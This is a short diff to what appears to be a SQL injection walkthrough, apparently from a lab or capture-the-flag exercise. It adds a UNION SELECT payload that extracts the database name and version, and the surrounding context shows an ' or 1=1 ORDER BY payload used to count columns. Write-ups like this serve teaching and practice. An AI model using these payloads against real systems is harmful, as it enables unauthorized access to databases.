@@ -122,13 +122,22 @@ But guess what?  .... with <code>' or 1=1 ORDER BY 1,2,3,4,5,6</code> the output
 
 <br>
 
-<p>So we can conclude that thre are <code>5</code> columns!  Leté try <code>UNION</code></p>
+<p>So we can conclude that there are <code>5</code> columns!  Leté try <code>UNION</code></p>
 
 <br>
 
 ![image](https://github.com/user-attachments/assets/097118f6-9e37-45be-bca5-f53034b80bd6)
 
 <br>
+
+<pre><code>?id=5%20union%20select%201,database(),3,version(),5</code></pre>
+
+![image](https://github.com/user-attachments/assets/ebff2b2c-1b99-4610-9e0d-c7e0140d81fc)
+
+<br>
+
+<p>Now we now the version!</p>
+
 
 
 <p>Buy, Buy, Buy</p>
